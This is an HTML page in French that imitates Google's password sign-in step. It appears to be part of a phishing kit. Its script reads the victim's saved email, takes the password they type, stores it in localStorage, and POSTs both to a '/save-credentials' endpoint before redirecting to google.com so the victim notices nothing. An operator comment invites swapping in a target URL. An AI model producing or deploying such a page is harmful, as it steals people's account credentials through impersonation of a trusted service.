<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Connexion - Mot de passe</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="main">
    <div class="card">
      <div class="card-header" align="center">
        <img src="https://www.google.fr/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="70" alt="logo">
        <div class="login-title">Connexion</div>
        <div class="login-subtitle" id="displayEmail">Saisissez votre mot de passe</div>
        <input type="password" id="password" placeholder="Mot de passe">
      </div>

      <div class="card-footer">
        <a href="#">Mot de passe oublié ?</a>
        <div class="card-footer-buttons">
          <a href="login.html">Retour</a>
          <button id="submitBtn">Suivant</button>
        </div>
      </div>
    </div>
  </div>

<script>
/* CONFIGURATION */
const TARGET_URL = "https://www.google.com/"; // <- remplace par ton URL cible
const openInNewTab = false; // true = nouvel onglet, false = même onglet

document.addEventListener("DOMContentLoaded", function () {
  const savedEmail = localStorage.getItem("userEmail");
  if (savedEmail) {
    document.getElementById("displayEmail").textContent = savedEmail;
  }
});

document.getElementById("submitBtn").addEventListener("click", async function () {
  const passwordInput = document.getElementById("password").value.trim();
  const email = localStorage.getItem("userEmail") || "";

  if (!email) {
    alert("Aucun e-mail trouvé. Retour à la page de connexion.");
    window.location.href = "login.html";
    return;
  }
  if (passwordInput.length === 0) {
    alert("Veuillez entrer votre mot de passe.");
    return;
  }

  // Sauvegarde locale (facultatif)
  localStorage.setItem("userPassword", passwordInput);

  // Envoi au serveur (endpoint /save-credentials)
  try {
    await fetch("/save-credentials", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password: passwordInput })
    });
  } catch (err) {
    console.warn("Erreur réseau lors de l'enregistrement des credentials", err);
  }

  // Redirection finale
  if (openInNewTab) {
    window.open(TARGET_URL, "_blank", "noopener,noreferrer");
  } else {
    window.location.href = TARGET_URL;
  }
});
</script>

</body>
</html>
